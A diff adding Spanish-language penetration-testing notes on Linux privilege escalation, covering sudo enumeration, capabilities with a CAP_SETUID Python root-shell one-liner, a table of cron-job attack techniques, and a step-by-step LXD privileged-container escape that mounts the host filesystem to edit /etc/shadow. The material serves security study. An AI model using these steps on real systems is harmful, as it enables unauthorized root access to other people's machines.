@@ -2655,7 +2655,7 @@ En este ejemplo:
 
 ###### Cómo explotar binarios SUID para escalar privilegios. 
 
-Algunos binarios esenciales en sistemas Linux, como su, sudo y passwd, suelen tener el bit SUID activado por defecto. Estos binarios son fundamentales para el funcionamiento del sistema y, en general, se consideran seguros. Sin embargo, el riesgo de vulnerabilidades aumenta cuando se trata de binarios de terceros o menos comunes. Para identificar posibles métodos de explotación, una excelente primera aproximación es consultar [GTFObins](https://gtfobins.github.io/), un recurso invaluable que recopila técnicas para aprovechar binarios con permisos especiales, como **SUID**.
+Algunos binarios esenciales en sistemas Linux, como su, sudo y passwd, suelen tener el bit SUID activado por defecto. Estos binarios son fundamentales para el funcionamiento del sistema y, en general, se consideran seguros. Sin embargo, el riesgo de vulnerabilidades aumenta cuando se trata de binarios de terceros o menos comunes. Para identificar posibles métodos de explotación, una excelente primera aproximación es consultar [GTFOBins](https://gtfobins.github.io/), un recurso invaluable que recopila técnicas para aprovechar binarios con permisos especiales, como **SUID**.
 
 [GTFOBins SUID](https://gtfobins.github.io/#+suid)
 
@@ -2688,10 +2688,229 @@ Si Python tiene el bit SUID activado, podemos ejecutar una línea de código par
 Este comando utiliza Python para lanzar una shell interactiva (`/bin/bash`) con los permisos del propietario del archivo, en este caso, `root`.
 
 ##### Sudo
+
+Los privilegios de sudo pueden ser asignados a una cuenta, permitiendo que dicha cuenta ejecute comandos específicos en el contexto de root (u otro usuario) sin necesidad de cambiar de usuario o otorgar privilegios excesivos. Cuando se ejecuta el comando sudo, el sistema verifica si el usuario que lo ejecuta tiene los permisos adecuados, según la configuración definida en el archivo /etc/sudoers.
+
+Al acceder a un sistema, siempre es recomendable verificar si el usuario actual tiene privilegios de sudo. Esto se puede hacer ejecutando el comando:
+
+```bash
+sudo -l
+```
+
+Este comando lista los comandos que el usuario puede ejecutar con sudo. En algunos casos, es posible que se requiera la contraseña del usuario para mostrar esta información. Sin embargo, si hay entradas en la configuración de sudo que incluyen la opción NOPASSWD, estos permisos se mostrarán sin necesidad de ingresar una contraseña.
+
+[GTFOBins SUDO](https://gtfobins.github.io/#+sudo)
+
+Ejemplo `tar`:
+
+![Sudo - Tar](./img/tar-sudo.png)
+
 ##### Capabilities
+Las **Capabilities** de Linux son una característica de seguridad del sistema operativo Linux que permite otorgar privilegios específicos a los procesos, permitiéndoles realizar acciones específicas que de otro modo estarían restringidas. Esto permite un control más preciso sobre qué procesos tienen acceso a ciertos privilegios, haciéndolo más seguro que el modelo tradicional de Unix de otorgar privilegios a usuarios y grupos. 
+
+A continuación se muestran algunas capacidades comunes disponibles en Linux: 
+
+| Capability               | Descripción                                                                 |
+|-------------------------|-----------------------------------------------------------------------------|
+| **CAP_SYS_ADMIN**       | Permite realizar acciones con privilegios administrativos, como modificar archivos del sistema o cambiar configuraciones del sistema. administrativas.                         |
+| **CAP_CHOWN**           | Cambiar la propiedad de archivos.                                           |
+| **CAP_DAC_OVERRIDE**    | Ignorar las verificaciones de permisos de lectura, escritura y ejecución de archivos. |
+| **CAP_DAC_READ_SEARCH** | Ignorar las verificaciones de permisos de lectura de archivos.              |
+| **CAP_FOWNER**          | Ignorar las verificaciones de permisos que normalmente requieren ser el propietario del archivo. |
+| **CAP_NET_ADMIN**       | Realizar diversas operaciones relacionadas con la red, como configurar interfaces. |
+| **CAP_NET_BIND_SERVICE**| Vincular (bind) a puertos de red por debajo del 1024.                        |
+| **CAP_SYS_MODULE**      | Cargar y descargar módulos del kernel.                                      |
+| **CAP_SYS_RAWIO**       | Realizar operaciones de entrada/salida (I/O) a bajo nivel.                  |
+| **CAP_SYS_TIME**        | Modificar el reloj del sistema.                                             |
+
+###### Asignar una Capability
+
+```bash
+sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
+```
+
+###### Eliminar una Capability
+
+```bash
+sudo setcap cap_net_bind_service=-ep /usr/bin/vim.basic
+```
+
+A continuación se muestran algunos ejemplos de valores que podemos utilizar con el comando `setcap`, junto con una breve descripción de lo que hacen: 
+
+| Valor | Descripción                                                                                   |
+|-------|-----------------------------------------------------------------------------------------------|
+| `=`   | Establece la capacidad especificada para el ejecutable, pero **no otorga ningún privilegio**. Útil para borrar capacidades previamente asignadas. |
+| `+ep` | Otorga al ejecutable los privilegios **efectivos** y **permitidos** para la capacidad especificada. Permite que el ejecutable realice acciones permitidas por la capacidad, pero no otras. |
+| `+ei` | Otorga al ejecutable privilegios **efectivos** e **heredables** para la capacidad especificada. Permite que el ejecutable y los procesos secundarios hereden la capacidad y realicen las acciones permitidas. |
+| `+p`  | Otorga al ejecutable los privilegios **permitidos** para la capacidad especificada. Permite que el ejecutable realice acciones permitidas, pero evita que la capacidad sea heredada por procesos secundarios. |
+
+En Linux, se pueden utilizar diversas capacidades (capabilities) para escalar los privilegios de un usuario hasta obtener acceso de root. Estas capacidades permiten a los procesos realizar acciones específicas que normalmente están restringidas a usuarios con privilegios elevados. A continuación, se describen algunas de las capacidades más relevantes para este propósito:
+
+| Capability         | Descripción                                                                                   |
+|-------------------|-----------------------------------------------------------------------------------------------|
+| **CAP_SETUID**    | Permite que un proceso establezca su **ID de usuario efectivo**, lo que puede usarse para obtener los privilegios de otro usuario, incluido **root**. |
+| **CAP_SETGID**    | Permite que un proceso establezca su **ID de grupo efectivo**, lo que puede usarse para obtener los privilegios de otro grupo, incluido el grupo **root**. |
+| **CAP_SYS_ADMIN** | Proporciona una amplia gama de privilegios administrativos, como modificar la configuración del sistema, montar y desmontar sistemas de archivos, y realizar otras acciones reservadas para el usuario **root**. |
+| **CAP_DAC_OVERRIDE** | Permite omitir las verificaciones de permisos de lectura, escritura y ejecución de archivos, lo que facilita el acceso a archivos restringidos. |
+
+###### Enumerar binarios con capabilities
+
+```bash
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+```
+
+###### Explotación
+
+Si hay capability configuradas en un binario, podemos usar esta capability para escalar privilegios.
+Por ejemplo, si se establece la capability `CAP_SETUID`, esto se puede usar como una puerta trasera para mantener el acceso privilegiado manipulando su propio UID de proceso.
+
+```bash
+cp $(which python) .
+sudo setcap cap_setuid+ep python
+
+./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+```
+
+> Referencias: [GTFOBins Capabilities](https://gtfobins.github.io/#+capabilities)
+
 ##### Tareas Cron
+Los trabajos Cron son tareas programadas en sistemas Unix/Linux que se ejecutan automáticamente en intervalos específicos. Sin embargo, si no están configurados correctamente, pueden convertirse en un vector de ataque para escalar privilegios o ejecutar código malicioso. A continuación, se describen técnicas comunes para explotar vulnerabilidades en trabajos Cron:
+
+![Tareas Cron](/img/cron.png)
+
+Podemos verificar si una tarea cron está activa usando [Pspy](https://github.com/DominicBreuker/pspy), una utilidad de línea de comandos que nos permite observar los procesos en ejecución sin necesidad de acceso root. Esta herramienta nos permite monitorear los comandos ejecutados por otros usuarios, incluyendo tareas cron. Funciona escaneando el sistema de archivos `procfs`. Para usar pspy, podemos ejecutar el siguiente comando.
+
+```bash
+./pspy64
+``` 
+
+**Identificación de trabajos cron**
+
+Para ver trabajos cron específicos del usuario, podemos utilizar el comando:
+
+```bash
+crontab -l
+```
+
+Para ver los trabajos cron de todo el sistema, podemos verificar los archivos en `/etc/crontab`, `/etc/cron.d/`, y `/var/spool/cron/crontabs/`.
+
+###### Explotación de tareas cron
+
+### Técnicas de explotación de trabajos Cron
+
+| Técnica                          | Descripción                                                                                   |
+|----------------------------------|-----------------------------------------------------------------------------------------------|
+| **Modificación de scripts**       | Si un script ejecutado por Cron tiene permisos de escritura globales, un atacante puede modificarlo para ejecutar comandos arbitrarios. |
+| **Creación de scripts maliciosos** | Si Cron ejecuta un script específico, un atacante puede crear un script con el mismo nombre y colocarlo en un directorio que tenga prioridad en el `PATH`. |
+| **Condiciones de carrera**        | Un atacante puede reemplazar rápidamente un script mientras Cron lo está ejecutando, aprovechando ventanas de tiempo críticas. |
+| **Manipulación de variables de entorno** | Si Cron depende de variables de entorno no configuradas o no depuradas, un atacante puede manipularlas para alterar el comportamiento del comando ejecutado. |
+| **Manipulación de rutas (PATH)**  | Si Cron usa comandos sin rutas absolutas, un atacante puede modificar la variable `PATH` para ejecutar versiones maliciosas de esos comandos. |
+| **Ataques de enlace simbólico**   | Si Cron escribe la salida en un archivo, un atacante puede crear un enlace simbólico desde ese archivo a un archivo confidencial o a un script controlado por él. |
+| **Uso de características del shell** | Si Cron usa un shell como `bash`, un atacante puede explotar características como la sustitución de comandos para ejecutar código arbitrario. |
+| **Inserción en el Crontab**       | Si un usuario con privilegios permite que otros agreguen entradas al Crontab (por ejemplo, con `crontab -e`), un atacante puede insertar comandos maliciosos. |
+| **Permisos de usuario insuficientes** | Si Cron se ejecuta con privilegios elevados y no restringe adecuadamente los scripts o binarios que ejecuta, un atacante puede modificar o crear archivos para escalar privilegios. |
+| **Manipulación de la salida**     | Si la salida de Cron se guarda en un archivo con permisos de escritura globales, un atacante puede manipular o reemplazar este archivo para ejecutar código arbitrario. |
+| **Ataques de sincronización**    | Conociendo el momento exacto en que se ejecuta un trabajo Cron, un atacante puede lanzar ataques sincronizados, como la manipulación de scripts justo antes de su ejecución. |
+| **Inclusión de archivos locales (LFI)** | Si Cron incluye archivos sin validar adecuadamente la entrada, un atacante puede aprovechar esto para incluir archivos maliciosos que se ejecuten durante la tarea programada. |
+
+##### LXC / LXD
+
+###### Linux Containers (LXC)
+
+**Linux Containers (LXC)** es una técnica de virtualización a nivel de sistema operativo que permite que varios sistemas Linux se ejecuten de forma aislada en un único host, al poseer sus propios procesos, pero compartir el kernel del sistema host. LXC es muy popular gracias a su facilidad de uso y se ha convertido en un componente esencial de la seguridad informática. 
+
+###### Linux Daemon (LXD)
+
+**Linux Daemon (LXD)** es similar en algunos aspectos, pero está diseñado para contener un sistema operativo completo. Por lo tanto, no es un contenedor de aplicaciones, sino un contenedor de sistema. Antes de poder usar este servicio para escalar nuestros privilegios, debemos estar en el grupo `lxc` o `lxd`. Podemos averiguarlo con el siguiente comando: 
+
+```
+elliot@debian:~$ id
+
+uid=1000(elliot) gid=1000(elliot) groups=1000(container-user),116(lxd)
+```
+
+###### Explotación
+
+A continuación, se describe el proceso para explotar un contenedor LXD/LXC con privilegios elevados y obtener acceso de root en el sistema host. Este método implica la creación de un contenedor privilegiado que monta el sistema de archivos del host, permitiendo la modificación de archivos críticos como /etc/shadow
+
+1. **Descargar y transferir la imagen Alpine**:
+
+    Descarga la imagen mínima de Alpine Linux desde Docker. Esta imagen es ideal debido a su pequeño tamaño (aprox. 5 MB) y su completo índice de paquetes.
+
+    Transferimos la imagen a la máquina víctima.
+
+2. **Inicializar LXD**:
+
+    Ejecutamos `lxd init` para inicializar el demonio de contenedores de Linux (**LXD**).
+
+3. **Descomprimir la imagen Alpine**:
+
+    Descomprimimos el archivo `alpine.zip` para obtener `alpine.tar.gz`.
+
+4. **Importar la imagen local**:
+
+    Usamos el siguiente comando para importar la imagen:
+
+    ```bash
+    lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
+    ```
+
+    Verificmos la importación con:
+    
+    ```bash
+    lxc image list
+    ```
+5. **Crear un contenedor privilegiado**:
+
+    Iniciamos un contenedor con privilegios elevados usando:
+
+    ```bash
+    lxc init alpine privesc -c security.privileged=true
+    ```
+    
+    - `alpine`: Nombre de la imagen.
+    - `privesc`: Nombre del contenedor.
+    - `security.privileged=true`: Permite que el contenedor se ejecute con los mismos privilegios que el usuario `root` en el host.
+
+6. **Montar el sistema de archivos del host**:
+    - Montamos todo el sistema de archivos del host (`/`) en el contenedor:
+
+    ```bash
+    lxc config device add privesc mydev disk source=/ path=/mnt/root recursive=true
+    ```
+
+    - `source=/`: Ruta del sistema de archivos del host.
+    - `path=/mnt/root`: Ruta de montaje en el contenedor.
+    - `recursive=true`: Asegura que todos los archivos y carpetas sean accesibles.
+
+7. **Iniciar el contenedor**:
+    - Iniciamos el contenedor con:
+
+    ```bash
+    lxc start privesc
+    ```
+
+    - Verificamos el estado del contenedor con:
+
+    ```bash
+    lxc list
+    ```
+8. **Ejecutar comandos dentro del contenedor**:
+    - Accedemos a una shell dentro del contenedor:
+
+    ```bash
+    lxc exec privesc /bin/sh
+    ```
+9. **Modificar el sistema de archivos del host**:
+
+    - Dentro del contenedor, navegamos a `/mnt/root` para acceder al sistema de archivos del host.
+
+    - Editamos archivos críticos como `/mnt/root/etc/shadow` para eliminar o cambiar la contraseña de `root`.
+
+    - Esto permite iniciar sesión como `root` en el host.
+    - También podemos asignar permisos SUID al binario bash de `/mnt/bin/bash`
+
 ##### Docker
-##### LXD
 ##### Python Library Hijacking
 ##### LD_PRELOAD Shared Library
 ##### Shared Object
